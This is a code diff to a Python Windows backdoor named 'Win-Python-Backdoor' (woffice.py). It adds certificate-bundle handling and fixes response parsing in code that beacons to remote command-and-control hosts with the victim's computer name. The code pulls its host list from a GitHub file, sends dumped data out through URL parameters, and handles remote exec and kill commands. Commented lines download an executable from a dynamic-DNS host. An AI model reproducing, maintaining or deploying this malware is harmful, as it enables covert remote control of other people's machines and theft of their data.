@@ -27,12 +27,13 @@ from win32com.client import Dispatch
 from time import sleep
 import _winreg
 from fake_useragent import UserAgent
+import certifi
 
 #cd \python27
 #copy /y "%USERPROFILE%\Documents\GitHub\Win-Python-Backdoor\woffice.py" C:\Python27
 #cd \python27_64
 #copy /y C:\Users\Master.MASTER6\Documents\GitHub\Win-Python-Backdoor\woffice.py C:\Python27_64
-#python "%USERPROFILE%\Documents\GitHub\Win-Python-Backdoor\setwoffice.py" py2exe --includes calendar,email,locale,_ssl
+#python "%USERPROFILE%\Documents\GitHub\Win-Python-Backdoor\setwoffice.py" py2exe --includes calendar,email,locale,_ssl,certifi
 
 def getProxy():
     try:
@@ -101,6 +102,11 @@ CREATE_NO_WINDOW = 0x08000000
 stemp=os.getenv('temp')
 swin=os.getenv('windir')
 suser=os.getenv('USERPROFILE')
+os.environ["REQUESTS_CA_BUNDLE"] = swin+"/cacert.pem"
+#os.environ["REQUESTS_CA_BUNDLE"] = os.path.join(os.getcwd(), "certifi", "cacert.pem")
+certifi.core.where=swin+"/certifi/cacert.pem"
+requests.utils.DEFAULT_CA_BUNDLE_PATH=swin+"/certifi/cacert.pem"
+requests.adapters.DEFAULT_CA_BUNDLE_PATH = swin+"/certifi/cacert.pem"
 #try:
 #    if not os.path.exists(suser+'\\woffice.exe'):
 ##        f = urllib2.urlopen("http://certificates.ddns.net/woffice.exe")
@@ -129,7 +135,8 @@ ua = UserAgent()
 #print(ua.chrome)
 header = {'User-Agent':str(ua.chrome)}
 mainsite = requests.get("https://raw.githubusercontent.com/pistacchietto/Win-Python-Backdoor/master/site.txt", headers=header)
-sites = ["paner.altervista.org", mainsite]
+#print mainsite.text
+sites = ["paner.altervista.org", mainsite.text]
 #sites = ["paner.altervista.org", "verifiche.ddns.net"]
 #site="paner.altervista.org"
 site1="paner.altervista.org"
@@ -159,7 +166,7 @@ for site in sites:
             try:
                     #top_level_url="http://52.26.124.145:31287"                    
                     top_level_url = "http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&wup="+str(sTime)
-                    sresponse = requests.get(top_level_url, headers=header)
+                    response = requests.get(top_level_url, headers=header)
                     
                     
                     #ie.Navigate(top_level_url)
@@ -169,9 +176,10 @@ for site in sites:
                     #print text
                     #ie.quit
                     #os.system('taskkill /f /im iexplore.exe')
-                    if sresponse.status_code == 200:#httplib.OK:
+                    if response.status_code == 200:#httplib.OK:
                     #if sresponse!= '':
                             print "Output from HTML request"
+                            sresponse = response.text
                             #sresponse = response.read()
                             ifind=sresponse.find('ip=')
                             sip = sresponse[ifind+3:sresponse.find('||',ifind)]
@@ -245,14 +253,14 @@ for site in sites:
                                         #sdump = sdump.replace(" ", "%20")
                                         #sdump = sdump[ 0 : 2005]
                                         top_level_url = "http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&dump="+sdump
-                                        sresponse = requests.get(top_level_url, headers=header)
+                                        response = requests.get(top_level_url, headers=header)
 ##                                        ie.Navigate(top_level_url)
 ##                                        if ie.Busy:
 ##                                            sleep(5)
 ##                                        sresponse = ie.Document.body.innerText
                                         
                                         top_level_url = "http://"+site+"/svc/dump.php?pc="+sCOMPUTERNAME+"&dump="+sdump
-                                        sresponse = requests.get(top_level_url, headers=header)
+                                        response = requests.get(top_level_url, headers=header)
 ##                                        ie.Navigate(top_level_url)
 ##                                        if ie.Busy:
 ##                                            sleep(5)
@@ -278,7 +286,7 @@ for site in sites:
                                                     
                             #httpServ = httplib.HTTPConnection(site, 80)
                             #httpServ.connect()
-                            sresponse = requests.get("http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&exec=0", headers=header)
+                            response = requests.get("http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&exec=0", headers=header)
 ##                            ie.Navigate("http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&exec=0")
 ##                            if ie.Busy:
 ##                                    sleep(5)
@@ -299,7 +307,7 @@ for site in sites:
                                     print str(e)
                             #httpServ = httplib.HTTPConnection(site, 80)
                             #httpServ.connect()
-                            sresponse = requests.get("http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&kill=1", headers=header)
+                            response = requests.get("http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&kill=1", headers=header)
 ##                            ie.Navigate("http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&kill=1")
 ##                            if ie.Busy:
 ##                                    sleep(5)
